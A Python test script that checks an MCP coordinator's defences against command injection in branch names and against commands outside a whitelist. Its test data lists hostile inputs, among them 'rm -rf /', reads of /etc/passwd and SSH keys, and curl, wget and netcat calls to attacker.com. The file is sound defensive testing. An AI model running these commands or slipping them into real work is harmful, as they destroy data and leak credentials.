#!/usr/bin/env python3
"""Test script to verify command injection security fixes in MCP coordinator"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import directly from the server module
import mcp_coordinator.server as server
EnhancedAgentCoordinator = server.EnhancedAgentCoordinator
SecurityError = server.SecurityError
import json
from datetime import datetime

def test_command_injection_prevention():
    """Test that command injection attempts are blocked"""
    coordinator = EnhancedAgentCoordinator()
    
    print("Testing Command Injection Prevention")
    print("=" * 50)
    
    # Test cases with malicious branch names
    malicious_inputs = [
        "test; rm -rf /",  # Command separator
        "test && cat /etc/passwd",  # Command chaining
        "test | nc attacker.com 1234",  # Pipe to network
        "test > /tmp/exploit",  # Output redirection
        "test < /etc/passwd",  # Input redirection
        "test`whoami`",  # Command substitution
        "test$(whoami)",  # Command substitution
        "../../../etc/passwd",  # Directory traversal
        "~/.ssh/id_rsa",  # Home directory access
        "test\nrm -rf /",  # Newline injection
        "test\x00malicious",  # Null byte injection
        "test$PATH",  # Environment variable
        "a" * 200,  # Excessive length
        "",  # Empty string
        "test;",  # Trailing semicolon
        "test&",  # Background execution
    ]
    
    results = []
    
    for malicious_input in malicious_inputs:
        try:
            print(f"\nTesting: {repr(malicious_input)}")
            coordinator.create_worktree(malicious_input)
            results.append({
                "input": malicious_input,
                "status": "FAILED - Input was not blocked!",
                "error": None
            })
            print(f"  ❌ SECURITY ISSUE: Input was not blocked!")
        except ValueError as e:
            results.append({
                "input": malicious_input,
                "status": "PASSED - Input blocked",
                "error": str(e)
            })
            print(f"  ✅ Blocked: {e}")
        except Exception as e:
            results.append({
                "input": malicious_input,
                "status": "ERROR",
                "error": f"{type(e).__name__}: {str(e)}"
            })
            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
    
    # Test valid branch names
    print("\n\nTesting Valid Branch Names")
    print("=" * 50)
    
    valid_inputs = [
        "feature/test-branch",
        "bugfix/issue-123",
        "release/v1_0_0",
        "AUTO_fix_security",
        "test-branch-123",
    ]
    
    for valid_input in valid_inputs:
        try:
            print(f"\nTesting: {repr(valid_input)}")
            # We can't actually create the worktree without git setup,
            # but we can verify it passes validation
            if coordinator._validate_branch_name(valid_input):
                results.append({
                    "input": valid_input,
                    "status": "PASSED - Valid input accepted",
                    "error": None
                })
                print(f"  ✅ Accepted")
            else:
                results.append({
                    "input": valid_input,
                    "status": "FAILED - Valid input rejected",
                    "error": "Validation failed"
                })
                print(f"  ❌ Rejected (should be valid)")
        except Exception as e:
            results.append({
                "input": valid_input,
                "status": "ERROR",
                "error": f"{type(e).__name__}: {str(e)}"
            })
            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
    
    # Generate report
    report = {
        "test_name": "Command Injection Security Test",
        "timestamp": datetime.now().isoformat(),
        "total_tests": len(results),
        "passed": len([r for r in results if "PASSED" in r["status"]]),
        "failed": len([r for r in results if "FAILED" in r["status"]]),
        "errors": len([r for r in results if r["status"] == "ERROR"]),
        "results": results
    }
    
    # Save report
    report_file = f"security_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n\nTest Summary")
    print("=" * 50)
    print(f"Total Tests: {report['total_tests']}")
    print(f"Passed: {report['passed']}")
    print(f"Failed: {report['failed']}")
    print(f"Errors: {report['errors']}")
    print(f"\nReport saved to: {report_file}")
    
    # Return success if all malicious inputs were blocked
    malicious_blocked = all(
        "PASSED" in r["status"] 
        for r in results[:len(malicious_inputs)]
    )
    
    valid_accepted = all(
        "PASSED" in r["status"] 
        for r in results[len(malicious_inputs):]
    )
    
    if malicious_blocked and valid_accepted:
        print("\n✅ All security tests passed!")
        return True
    else:
        print("\n❌ Some security tests failed!")
        return False

def test_command_whitelist():
    """Test that only whitelisted commands can be executed"""
    coordinator = EnhancedAgentCoordinator()
    
    print("\n\nTesting Command Whitelist")
    print("=" * 50)
    
    # Test unauthorized commands
    unauthorized_commands = [
        ['rm', '-rf', '/'],
        ['curl', 'http://attacker.com'],
        ['wget', 'http://attacker.com'],
        ['nc', 'attacker.com', '1234'],
        ['python', '-c', 'malicious code'],
        ['bash', '-c', 'malicious code'],
        ['sh', '-c', 'malicious code'],
    ]
    
    for cmd in unauthorized_commands:
        try:
            print(f"\nTesting unauthorized command: {cmd}")
            coordinator._execute_command(cmd)
            print(f"  ❌ SECURITY ISSUE: Command was not blocked!")
        except SecurityError as e:
            print(f"  ✅ Blocked: {e}")
        except Exception as e:
            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
    
    # Test authorized but restricted subcommands
    restricted_subcommands = [
        ['git', 'push', 'origin', 'master'],  # push not in whitelist
        ['git', 'rm', '-rf', '.'],  # rm not in whitelist
        ['git', 'config', 'user.name', 'attacker'],  # config not in whitelist
    ]
    
    for cmd in restricted_subcommands:
        try:
            print(f"\nTesting restricted subcommand: {cmd}")
            coordinator._execute_command(cmd)
            print(f"  ❌ SECURITY ISSUE: Subcommand was not blocked!")
        except SecurityError as e:
            print(f"  ✅ Blocked: {e}")
        except Exception as e:
            print(f"  ⚠️  Error: {type(e).__name__}: {e}")

if __name__ == "__main__":
    success1 = test_command_injection_prevention()
    success2 = test_command_whitelist()
    
    if success1 and success2:
        print("\n\n🎉 All security tests passed successfully!")
        exit(0)
    else:
        print("\n\n⚠️  Some security tests failed. Please review the results.")
        exit(1)